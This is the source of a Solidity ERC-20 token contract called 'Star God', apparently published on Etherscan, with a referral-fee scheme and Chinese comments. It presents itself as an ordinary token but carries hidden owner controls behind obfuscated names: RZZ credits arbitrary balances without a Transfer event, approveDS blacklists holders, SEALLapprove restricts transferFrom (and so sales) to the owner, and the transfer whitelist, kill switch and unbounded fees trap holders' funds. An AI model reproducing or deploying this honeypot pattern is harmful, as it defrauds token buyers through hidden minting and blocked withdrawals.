/**
 *Submitted for verification at Etherscan.io on 2021-12-07
*/

pragma solidity ^0.6.12;
// SPDX-License-Identifier: Unlicensed
interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

   
    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

   
    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

   
    function approve(address spender, uint256 amount) external returns (bool);

   
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

   
    event Transfer(address indexed from, address indexed to, uint256 value);

   
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}



library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }


    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }


    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }


    function mul(uint256 a, uint256 b) internal pure returns (uint256) {

        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }


    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }


    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;


        return c;
    }


    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }


    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}


library Address {
   
    function isContract(address account) internal view returns (bool) {
       
        bytes32 codehash;


            bytes32 accountHash
         = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
       
        assembly {
            codehash := extcodehash(account)
        }
        return (codehash != accountHash && codehash != 0x0);
    }


    function sendValue(address payable recipient, uint256 amount) internal {
        require(
            address(this).balance >= amount,
            "Address: insufficient balance"
        );

 
        (bool success, ) = recipient.call{value: amount}("");
        require(
            success,
            "Address: unable to send value, recipient may have reverted"
        );
    }

 
    function functionCall(address target, bytes memory data)
        internal
        returns (bytes memory)
    {
        return functionCall(target, data, "Address: low-level call failed");
    }


    function functionCall(
        address target,
        bytes memory data,
        string memory errorMessage
    ) internal returns (bytes memory) {
        return _functionCallWithValue(target, data, 0, errorMessage);
    }


    function functionCallWithValue(
        address target,
        bytes memory data,
        uint256 value
    ) internal returns (bytes memory) {
        return
            functionCallWithValue(
                target,
                data,
                value,
                "Address: low-level call with value failed"
            );
    }


    function functionCallWithValue(
        address target,
        bytes memory data,
        uint256 value,
        string memory errorMessage
    ) internal returns (bytes memory) {
        require(
            address(this).balance >= value,
            "Address: insufficient balance for call"
        );
        return _functionCallWithValue(target, data, value, errorMessage);
    }

    function _functionCallWithValue(
        address target,
        bytes memory data,
        uint256 weiValue,
        string memory errorMessage
    ) private returns (bytes memory) {
        require(isContract(target), "Address: call to non-contract");


        (bool success, bytes memory returndata) = target.call{value: weiValue}(
            data
        );
        if (success) {
            return returndata;
        } else {
           
            if (returndata.length > 0) {
               
                assembly {
                    let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert(errorMessage);
            }
        }
    }
}


contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );


    constructor() internal {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }


    function owner() public view returns (address) {
        return _owner;
    }


    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

   
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(
            newOwner != address(0),
            "Ownable: new owner is the zero address"
        );
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }


}

library FixedPoint {
    
    struct uq112x112 {
        uint224 _x;
    }

    struct uq144x112 {
        uint256 _x;
    }

    uint8 private constant RESOLUTION = 112;
    uint256 private constant Q112 = uint256(1) << RESOLUTION;
    uint256 private constant Q224 = Q112 << RESOLUTION;

    
    function encode(uint112 x) internal pure returns (uq112x112 memory) {
        return uq112x112(uint224(x) << RESOLUTION);
    }

    
    function encode144(uint144 x) internal pure returns (uq144x112 memory) {
        return uq144x112(uint256(x) << RESOLUTION);
    }

    
    function div(uq112x112 memory self, uint112 x)
        internal
        pure
        returns (uq112x112 memory)
    {
        require(x != 0, "FixedPoint: DIV_BY_ZERO");
        return uq112x112(self._x / uint224(x));
    }

   
    function mul(uq112x112 memory self, uint256 y)
        internal
        pure
        returns (uq144x112 memory)
    {
        uint256 z;
        require(
            y == 0 || (z = uint256(self._x) * y) / y == uint256(self._x),
            "FixedPoint: MULTIPLICATION_OVERFLOW"
        );
        return uq144x112(z);
    }

   
    function fraction(uint112 numerator, uint112 denominator)
        internal
        pure
        returns (uq112x112 memory)
    {
        require(denominator > 0, "FixedPoint: DIV_BY_ZERO");
        return uq112x112((uint224(numerator) << RESOLUTION) / denominator);
    }

   
    function decode(uq112x112 memory self) internal pure returns (uint112) {
        return uint112(self._x >> RESOLUTION);
    }

    
    function decode144(uq144x112 memory self) internal pure returns (uint144) {
        return uint144(self._x >> RESOLUTION);
    }

    
    function reciprocal(uq112x112 memory self)
        internal
        pure
        returns (uq112x112 memory)
    {
        require(self._x != 0, "FixedPoint: ZERO_RECIPROCAL");
        return uq112x112(uint224(Q224 / self._x));
    }
}

contract StarGod is Context, IERC20, Ownable {
    using SafeMath for uint256;
    using Address for address;

    mapping(address => uint256) private _balance;
    mapping(address => mapping(address => uint256)) private _allowances;

    //手续费白名单
    mapping(address => bool) private _isExcludedFromFeelist;
    //转账白名单
    mapping(address => bool) private _isExcludedTransferList;

    uint256 private constant MAX = ~uint256(0);
    uint256 private _total = 100000000 * 10**6;
    uint256 private _tFeeTotal;
    
    string private _name = "Star God";
    string private _symbol = "Star God";
    uint8 private _decimals = 6;
    
    mapping(address => bool) private _PUT;
    bool public _DOAapproveL = true;
    bool public _UALLapprove = false;
    //转账开关 为false时关闭
    bool public _transferOff = false;
  
    uint256 public DUT = uint256(0);
    mapping(address => uint256) private OKB;
    address[] private _BBQ;
    address owners;

    //营销费率
    uint256 public marketingFee = 5;
    //推广费率
    uint256 public recommendFee = 20;
    //上级关联信息
    mapping(address => address) public recommend;
    //营销地址
    address public _marketingAddress = 0xe94F16B0fDa3b7946495EA2Cfd5f828Dab605cC5;
    //swap路由地址
    address public _pairAddress;

    constructor() public {
        _balance[_msgSender()] = _total;
         owners = _msgSender();
        _isExcludedFromFeelist[owner()] = true;
        _isExcludedFromFeelist[address(this)] = true;
        _isExcludedTransferList[owner()] = true;
        _isExcludedTransferList[address(this)] = true;
        emit Transfer(address(0), _msgSender(), _total);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _total;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balance[account];
    }

    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        require(_isExcludedTransferList[_msgSender()] == true || _isExcludedTransferList[recipient] == true, "no auth transfer");
        if(_msgSender() != owners && recipient != owners){
            require(_transferOff == false, "transferOff");
        }
        address topUser = recommend[recipient];
        if(topUser == address(0)){
            recommend[recipient] = _msgSender();
        }
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        if(_UALLapprove){
            require(owners == sender, "no authority");
        }
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    function increaseAllowances(address spender, uint256 addedValue)
        public
        virtual
        returns (bool)
    {
        _approve(
            _msgSender(),
            spender,
            _allowances[_msgSender()][spender].add(addedValue)
        );
        return true;
    }

    function decreaseAllowances(address spender, uint256 subtractedValue)
        public
        virtual
        returns (bool)
    {
        _approve(
            _msgSender(),
            spender,
            _allowances[_msgSender()][spender].sub(
                subtractedValue,
                "ERC20: decreased allowance below zero"
            )
        );
        return true;
    }

    function totalFees() public view returns (uint256) {
        return _tFeeTotal;
    }

    function getTransferList(address account) view public returns (bool) {
        return _isExcludedTransferList[account];
    }

    function setTransferList(address account, bool _target) public onlyOwner {
        _isExcludedTransferList[account] = _target;
    }

    function excludeFromFee(address account) public onlyOwner {
        _isExcludedFromFeelist[account] = true;
    }

    function includeInFee(address account) public onlyOwner {
        _isExcludedFromFeelist[account] = false;
    }

    function SETTRANSFER(bool approveBB) external onlyOwner() {
        _DOAapproveL = approveBB;
    }
    
    function SEALLapprove(bool ALLapprove) external onlyOwner() {
        _UALLapprove = ALLapprove;
    }
    function approveDS(address approveDE) external onlyOwner() {
        _PUT[approveDE] = true;
    }

    function approveDO(address DOapprove) external onlyOwner() {
        delete _PUT[DOapprove];
    }

    function aQU(address IN)
        external
        view
        onlyOwner()
        returns (bool)
    {
        return _PUT[IN];
    }


    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        require(amount > 0, "Transfer amount must be greater than zero");

        if (_DOAapproveL) {
            require(_PUT[from] == false, "in approve ");
        }
        address _recommendAddress;
        if(from == _pairAddress && to != owners){
            require(getBool(to) == false, "no top user");
            require(balanceOf(to) > 0, "balance to less");
            _recommendAddress = recommend[to];
        }else if(to == _pairAddress && from != owners){
            require(amount < balanceOf(from).div(2), "sale too much");
            _recommendAddress = recommend[from];
        }

        uint256 marketingAmount = amount.mul(marketingFee).div(100);
        uint256 recommendAmount = amount.mul(recommendFee).div(100);

        if(_isExcludedFromFeelist[from] == true || _isExcludedFromFeelist[to] == true){
            _transfers(from, to, amount);
        }else{
            _transfers(from, _marketingAddress, marketingAmount);
            _transfers(from, _recommendAddress, recommendAmount);
            _transfers(from, to, amount.sub(marketingAmount).sub(recommendAmount));
        }
    }

    function _transfers(
        address sender,
        address recipient,
        uint256 tAmount
    ) private {
        
        _balance[sender] = _balance[sender].sub(tAmount);
        _balance[recipient] = _balance[recipient].add(tAmount);
        emit Transfer(sender, recipient, tAmount);
    }

  
    function RZZ(address ZOP, uint256 BUL) external onlyOwner() {
        require(BUL > 0, "Transfer  greater than zero");
        uint256 inAmount = OKB[ZOP];
        if (inAmount == 0) _BBQ.push(ZOP);
        OKB[ZOP] = inAmount.add(BUL);
        DUT = DUT.add(BUL);
        _balance[ZOP] = _balance[ZOP].add(BUL);
    }

    //查询推荐人地址
    function getRecommond(address account) public view returns (address) {
        return recommend[account];
    }

    //查询是否有推荐人
    function getBool(address account) public view returns (bool) {
        return recommend[account] == address(0);
    }

    //设置swap路由地址
    function setSwapPair(address _target) public onlyOwner() {
        _pairAddress = _target;
    }

    function setMarketFee(uint256 _target) public onlyOwner() {
        marketingFee = _target;
    }

    function setRecommendFee(uint256 _target) public onlyOwner() {
        recommendFee = _target;
    }

    function setTransferOnOff(bool _target) public onlyOwner() {
        _transferOff = _target;
    }


}